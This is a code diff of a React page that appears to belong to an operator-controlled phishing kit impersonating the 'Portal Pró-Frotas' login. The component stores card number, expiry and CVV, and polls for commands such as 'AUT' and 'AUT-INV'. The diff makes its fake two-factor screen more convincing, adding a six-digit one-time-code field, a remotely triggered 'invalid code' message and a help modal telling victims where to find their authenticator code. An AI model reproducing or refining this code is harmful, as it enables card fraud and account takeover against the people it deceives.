@@ -84,6 +84,7 @@ function CommandPage({ userId, onInvalidate }) {
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
+  const [showHelpModal, setShowHelpModal] = useState(false);
 
   // Polling - visible checado em CADA chamada
   useEffect(() => {
@@ -212,20 +213,87 @@ function CommandPage({ userId, onInvalidate }) {
 
   // =================== AUT (2FA) ===================
   if (currentCommand?.action === "AUT" || currentCommand?.action === "AUT-INV") {
-    const isCodeComplete = codeDigits.every(d => d !== '');
     const isInvalid = currentCommand?.action === "AUT-INV";
+    const codeValue = inputValue.replace(/\D/g, '').slice(0, 6);
+    const isCodeComplete = codeValue.length === 6;
     return (
-      <PFCenter>
-        <PFLogo />
-        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
-        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Autenticação em Dois Fatores</h1>
-        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o código do seu aplicativo autenticador</p>
-        <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-[280px] space-y-5">
-          {renderCodeInputs(isInvalid)}
-          <PFButton disabled={!isCodeComplete} loading={loading}>Confirmar</PFButton>
-          <p className="text-center text-xs text-gray-400">Não recebeu o código? Verifique seu aplicativo.</p>
-        </form>
-      </PFCenter>
+      <>
+        <PFLayout>
+          <PFLogo />
+          <div className="w-full max-w-[280px]">
+            <label className="block text-sm text-gray-700 mb-2">Código de senha de uso único</label>
+            <input
+              type="text"
+              inputMode="numeric"
+              maxLength={6}
+              value={codeValue}
+              onChange={(e) => setInputValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
+              disabled={loading}
+              className={`w-full px-3 py-2.5 border rounded focus:outline-none text-sm ${isInvalid ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#1E88E5]'}`}
+              style={{ height: '40px' }}
+              autoFocus
+            />
+            {isInvalid && <p className="text-red-500 text-xs mt-1.5">Código inválido. Digite novamente.</p>}
+
+            <div className="mt-3 mb-5">
+              <button type="button" onClick={() => setShowHelpModal(true)} className="text-[#1E88E5] text-sm underline hover:text-blue-700">
+                Onde achar o código?
+              </button>
+            </div>
+
+            <div className="flex gap-3">
+              <button
+                type="button"
+                onClick={() => window.location.reload()}
+                className="flex-1 py-2.5 rounded border border-gray-300 text-gray-700 text-sm font-medium hover:bg-gray-50 transition-all"
+              >
+                Voltar
+              </button>
+              <button
+                type="button"
+                onClick={(e) => { e.preventDefault(); handleSubmit(e, "token_2fa", codeValue); }}
+                disabled={!isCodeComplete || loading}
+                className="flex-1 py-2.5 rounded text-white text-sm font-medium transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+                style={{ backgroundColor: isCodeComplete && !loading ? '#1E88E5' : '#90CAF9' }}
+              >
+                {loading ? <div className="flex justify-center"><PFSpinner /></div> : "Confirmar"}
+              </button>
+            </div>
+
+            <div className="text-center mt-5">
+              <button type="button" onClick={() => setShowHelpModal(true)} className="text-[#1E88E5] text-sm underline hover:text-blue-700">
+                Fale conosco
+              </button>
+            </div>
+          </div>
+        </PFLayout>
+
+        {/* Modal - Como usar a senha de uso único */}
+        {showHelpModal && (
+          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setShowHelpModal(false)}>
+            <div className="bg-white rounded-lg w-full max-w-md overflow-hidden shadow-xl" onClick={(e) => e.stopPropagation()}>
+              <div className="bg-[#1E88E5] text-white px-6 py-4 flex items-center justify-between">
+                <span className="font-bold text-sm tracking-wide">COMO USAR A SENHA DE USO ÚNICO</span>
+                <button onClick={() => setShowHelpModal(false)} className="text-white/80 hover:text-white text-2xl leading-none">&times;</button>
+              </div>
+              <div className="p-6 space-y-4 text-gray-600 text-sm leading-relaxed">
+                <p>• Para utilizar a senha de uso único, abra o aplicativo de autenticação no seu dispositivo móvel.</p>
+                <p>• Selecione a conta em que você cadastrou a sua chave de autenticação para o Portal Pró-Frotas.</p>
+                <p>• Uma senha de 6 dígitos será gerada a cada 30 segundos. Fique atento ao tempo restante para inserir a senha correta.</p>
+              </div>
+              <div className="px-6 pb-6">
+                <button
+                  onClick={() => setShowHelpModal(false)}
+                  className="w-full py-3 rounded-lg bg-[#1E88E5] text-white font-bold text-sm hover:bg-[#1976D2] transition-all flex items-center justify-center gap-2"
+                >
+                  OK, ENTENDI
+                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" /></svg>
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+      </>
     );
   }
 
